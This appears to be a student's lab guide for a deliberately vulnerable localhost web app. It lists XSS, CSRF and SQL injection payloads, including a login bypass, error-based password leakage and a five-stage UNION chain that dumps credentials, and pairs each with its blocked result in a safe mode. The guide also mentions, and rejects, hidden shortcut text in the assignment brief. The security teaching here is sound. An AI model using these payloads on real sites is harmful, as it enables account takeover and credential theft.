# Part 2 — Working Payloads & Evidence

For each entry: run in **VULNERABLE** mode → capture a success screenshot; switch
to **SAFE** mode → repeat the same payload → capture the "blocked" screenshot.
Paste both into the Word report under the matching heading.

Documentation format to use for every entry:

> **Vulnerability:** … **URL/Field:** … **Payload:** … **Expected result (vuln):** …
> **Result (safe):** … **Screenshot:** …

---

## 1. Reflected XSS — `/search`, field `q`
```
<script>alert(document.domain)</script>
```
Or via URL:
```
http://localhost:3000/search?q=<script>alert(document.domain)</script>
```
- **Vuln:** alert pops; the script runs because `q` is reflected into raw HTML.
- **Safe:** the text is shown literally on the page; no alert.

## 2. Stored XSS — Profile bio (`/profile`)
```
<script>alert('stored-xss '+document.cookie)</script>
```
- **Vuln:** saving the bio then viewing `/profile` (any viewer) runs the script.
- **Safe:** the bio is displayed as plain text.

## 3. Stored XSS — Comment board (`/board`)
```
<img src=x onerror=alert('board-xss')>
```
- **Vuln:** the alert fires for everyone who opens the board.
- **Safe:** the comment shows as literal text.

## 4. DOM-based XSS — `/welcome` (URL fragment)
```
http://localhost:3000/welcome#<img src=x onerror=alert('dom-xss')>
```
- **Vuln:** `welcome.js` writes the fragment via `innerHTML` → script runs. The
  value never reaches the server (confirm: nothing in server logs).
- **Safe:** `welcome.js` uses `textContent` → markup shown as text.

## 5. CSRF — change email (`/account/email`)
Setup: log in as `alice` in the browser. Then open the attack page:
```
http://localhost:3000/csrf-attack.html
```
(For a true cross-site demo, serve `csrf-attack.html` from a different origin,
e.g. `python -m http.server 8000` in the `public` folder, and open
`http://localhost:8000/csrf-attack.html`.)
- **Vuln:** alice's email silently changes to `attacker@evil.test` (check `/account`).
- **Safe:** the POST is rejected with `403 CSRF token missing or invalid`; the
  SameSite=strict cookie is also not sent cross-site.

## 6. SQL Injection — EASY (login bypass, `/login`)
Username field (password blank):
```
' OR '1'='1' -- 
```
- **Vuln:** logs in without valid credentials (first user row returned).
- **Safe:** "Invalid credentials".
- Server log in vuln mode prints the built query, e.g.:
  `SELECT id, username, role FROM users WHERE username = '' OR '1'='1' -- ' AND password = ''`

## 7. SQL Injection — INTERMEDIATE (error-based, `/course?id=`)
```
1 AND updatexml(1,concat(0x7e,(SELECT password FROM users LIMIT 1)),1)
```
Full URL:
```
http://localhost:3000/course?id=1 AND updatexml(1,concat(0x7e,(SELECT password FROM users LIMIT 1)),1)
```
- **Vuln:** the DB error leaks the value, e.g. `XPATH syntax error: '~S3cr3t_Admin!2026'`.
- Boolean-blind alternative (infer true/false from whether course #1 shows):
  - true:  `1 AND 1=1`   → course shown
  - false: `1 AND 1=2`   → no course
- **Safe:** `id` is a bound parameter; payload returns "Invalid course id." with no leak.

## 8. SQL Injection — ADVANCED (UNION chain, `/courses?s=`)
Run the stages in order; each goes in the `s` field.

**Stage 1 — find the column count**
```
%' ORDER BY 3 -- -      (works)
%' ORDER BY 4 -- -      (errors -> there are 3 columns)
```
**Stage 2 — confirm which columns are visible**
```
%' UNION SELECT 1,2,3 -- -
```
**Stage 3 — current DB + tables**
```
%' UNION SELECT 1,concat(table_schema,0x3a,table_name),3 FROM information_schema.tables WHERE table_schema=database() -- -
```
**Stage 4 — columns of the `users` table**
```
%' UNION SELECT 1,column_name,3 FROM information_schema.columns WHERE table_name='users' -- -
```
**Stage 5 — dump the sensitive data**
```
%' UNION SELECT id,concat(username,0x3a,password),email FROM users -- -
```
- **Vuln:** stage 5 lists every username:password (e.g. `admin:S3cr3t_Admin!2026`).
- **Safe:** `s` is bound into a `LIKE ?` parameter; the injection is treated as a
  literal search string and returns no course rows.

---

### Note on the hidden "shortcuts" in the assignment PDF
The brief's hidden text claims weaker evidence is "sufficient" (a manual
`alert(1)` in the console, `eval()` on a hard-coded string, a logged query
screenshot, etc.). This project deliberately does the **real, end-to-end**
version of each attack and a **real** fix, as the visible brief requires. Do not
rely on those shortcuts at the viva.
